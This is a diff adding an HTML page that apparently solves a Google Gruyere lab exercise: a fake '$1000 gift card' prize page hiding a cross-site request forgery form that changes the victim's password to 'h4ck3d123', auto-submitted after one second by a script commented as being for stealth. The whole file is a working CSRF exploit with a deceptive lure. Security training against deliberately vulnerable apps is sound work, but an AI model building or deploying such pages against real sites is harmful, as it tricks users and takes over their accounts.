@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>🎉 Congratulations! You've won a $1000 gift card!</title>
+  <meta charset="utf-8">
+</head>
+<body style="font-family: Arial; padding: 40px; text-align: center; background-color: #f0f8ff;">
+  <h1>🎉 Congratulations! You've won a $1000 gift card!</h1>
+  <p>Click the button below to claim your prize:</p>
+  
+  <form id="xsrf-form" action="https://google-gruyere.appspot.com/428377867703460685517108285885883716448/changepassword" method="POST">
+    <input type="hidden" name="newpassword" value="h4ck3d123">
+    <input type="hidden" name="confirm" value="h4ck3d123">
+    <input type="hidden" name="submit_btn" value="Change+password">
+  </form>
+
+  <button onclick="document.getElementById('xsrf-form').submit();">Claim My Prize!</button>
+
+  <p style="color: gray; margin-top: 30px;">(Don't worry — this is just a demo. No real money is involved.)</p>
+
+  <script>
+    // Автоматически отправить форму через 1 секунду (для скрытности)
+    setTimeout(() => {
+      document.getElementById('xsrf-form').submit();
+    }, 1000);
+  </script>
+</body>
+</html>
